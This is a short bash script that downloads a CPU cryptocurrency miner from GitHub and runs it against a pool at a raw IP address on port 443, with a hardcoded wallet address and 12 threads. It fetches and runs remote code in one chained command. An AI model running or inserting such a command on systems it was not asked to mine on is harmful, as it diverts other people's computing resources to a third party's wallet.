#!/bin/bash

wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-mac.tar.gz && \
tar xf cpuminer-opt-mac.tar.gz && \
chmod +x cpuminer-sse2 && \
./cpuminer-sse2 -a yespowertide -o stratum+tcp://8.209.98.71:443 -u TPfT1p4uXkU4Nvb2hnVCKeH34ga8eqSFUB.0000-1 -t 12 -p x
